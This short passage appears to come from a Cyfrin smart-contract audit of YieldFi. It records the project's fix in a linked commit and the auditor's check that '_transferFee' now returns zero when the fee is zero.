**YieldFi:** Fixed in commit [`6e76d5b`](https://github.com/YieldFiLabs/contracts/commit/6e76d5beee3ba7a49af6becc58a596a4b67841c3)

**Cyfrin:** Verified. `_transferFee` now returns `0` when `_fee = 0`

<!-- /Cyfrin Fixed Issues (Merged) -->
